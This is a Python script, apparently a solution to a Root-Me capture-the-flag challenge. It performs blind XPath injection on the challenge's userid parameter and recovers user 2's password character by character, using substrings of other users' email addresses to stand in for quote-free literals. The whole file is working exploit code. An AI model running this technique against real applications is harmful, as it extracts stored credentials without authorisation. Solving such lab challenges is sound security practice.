import requests

url1 = 'http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2 and substring((//user[position()=2]/password),'
url2 = ',1)=substring('
url3 = ','
url4 = ',1)'

box = [
	["(//user[position()=3]/email)","5",'a'],
	["(//user[position()=1]/email)","9",'b'],
	["(//user[position()=1]/email)","12",'c'],
	["(//user[position()=2]/email)","6",'d'],
	["(//user[position()=1]/email)","3",'e'],
	["(//user[position()=2]/email)","12",'g'],
	["(//user[position()=2]/email)","3",'h'],
	["(//user[position()=3]/email)","2",'i'],
	["(//user[position()=1]/email)","7",'j'],
	["(//user[position()=5]/email)","2",'l'],
	["(//user[position()=1]/email)","14",'m'],
	["(//user[position()=2]/email)","4",'n'],
	["(//user[position()=2]/email)","2",'o'],
	["name(//user/*[3])","1",'p'],
	["(//user[position()=2]/email)","11",'r'],
	["(//user[position()=5]/email)","4",'s'],
	["(//user[position()=1]/email)","2",'t'],
	["name(//user/*[1])","1",'u'],
	["(//user[position()=1]/email)","4",'v'],
	["name(//user/*[3])","5",'w'],
	["(//user[position()=4]/email)","5",'y'],
	["(//user[position()=3]/email)","11",'z'],
	["(//user[position()=1]/username)","1",'S'],
	["(//user[position()=2]/username)","1",'J'],
	["(//user[position()=3]/username)","1",'E'],
	["(//user[position()=1]/email)","6",'@'],
	["(//user[position()=1]/email)","11",'.'],
	["0","1","0"],
	["1","1","1"],
	["2","1","2"],
	["3","1","3"],
	["4","1","4"],
	["5","1","5"],
	["6","1","6"],
	["7","1","7"],
	["8","1","8"],
	["9","1","9"]
]

password = ""

for i in range (1,14):
	for j in box:
		url = url1 + str(i) + url2 + j[0] + url3 + j[1] + url4
		r = requests.get(url)
		if "XPath error" not in r.text:
			password += j[2]
			print("found character "+str(i)+": "+j[2])
			break

print(password)
